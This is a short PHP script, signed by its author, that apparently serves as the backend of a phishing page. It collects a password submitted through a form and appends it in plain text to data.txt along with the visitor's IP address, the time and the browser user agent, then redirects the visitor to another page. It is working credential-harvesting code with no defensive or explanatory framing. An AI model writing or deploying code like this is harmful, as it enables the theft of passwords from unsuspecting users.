<?php
// made by Ali Brohi

$password = $_POST["password"];
              
if(isset($password))
{
    $texts = "\n DATA*INSERTED\n\nPassword:: " . $password . "\nIP-Address:: " . $_SERVER['REMOTE_ADDR'] . "\nTime:: " . date("F j, Y, g:i a") . "\nDevice:: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n  **\n\n\n\n";

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $texts);
    fclose($fp);

    header("Location: we.php");
}
?>
